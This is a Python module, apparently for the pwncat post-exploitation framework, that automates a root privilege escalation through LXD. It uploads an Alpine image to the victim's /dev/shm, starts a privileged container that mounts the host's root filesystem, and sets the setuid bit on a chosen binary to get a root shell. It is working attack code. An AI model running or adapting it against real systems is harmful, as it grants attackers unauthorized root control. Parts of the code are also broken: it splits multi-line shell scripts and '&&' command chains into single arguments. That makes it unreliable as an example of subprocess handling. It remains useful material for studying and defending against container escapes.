import dataclasses
import os
import subprocess
import tempfile
from typing import AnyStr

import pwncat
from pwncat.commands import upload
from pwncat.gtfobins import Capability
from pwncat.modules.escalate import Technique


class LxcTechnique(Technique):
    def __init__(self, module):
        super(LxcTechnique, self).__init__(Capability.SHELL, "root", module)

    def exec(self, binary: str):
        # Build image
        image_src_path = self._get_alpine_tar()

        @dataclasses.dataclass
        class DownloadArgs:
            source: AnyStr
            destination: AnyStr

        # Upload image
        filename = image_src_path.split(b'/')[-1]
        image_dest_path = f"/dev/shm/{filename}".encode()
        upload.Command().run(DownloadArgs(image_src_path, image_dest_path))
        pwncat.victim.tamper.created_file(image_dest_path)

        # Remove image
        os.remove(image_src_path)

        # Intermission

        # Act 2: The Actening returns
        mount_image_script = (
            "lxc init myimage ignite -c security.privileged=true && " 
            "lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true && "
            "lxc start ignite && "
            f"lxc exec ignite -- chmod +s /mnt/root/{binary}"

        )
        pwncat.victim.subprocess(mount_image_script.split())
        pwncat.victim.run(binary)

        return "exit"

    def _get_alpine_tar(self) -> bytes:
        get_alpine = """
        {
            cd /dev/shm || exit 1 && 
            git clone https://github.com/saghul/lxd-alpine-builder.git || exit 1 &&
            sudo ./lxd-alpine-builder/build-alpine
            rm -rf lxd-alpine-builder
            echo "$(pwd)/lxd-alpine-builder"
        } 2>/dev/null | tail -n 1
        """
        process = subprocess.Popen(get_alpine.split(), stdout=subprocess.PIPE)
        image_src_path, error = process.communicate()
        if error:
            raise RuntimeError(f"Error encountered while building alpine: {error}")
        return image_src_path


